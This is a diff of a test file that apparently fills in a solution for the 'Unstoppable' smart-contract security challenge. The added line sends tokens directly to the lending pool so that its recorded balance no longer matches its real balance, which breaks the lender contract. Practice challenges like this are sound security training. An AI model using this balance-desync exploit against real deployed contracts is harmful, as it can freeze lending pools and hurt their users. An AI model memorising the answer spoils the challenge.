@@ -39,7 +39,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // MY SOLUTION
+        // this transfers tokens with IERC20 method transfer, which creates bug in UnstoppableLender contract, because poolBalance != balanceBefore
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
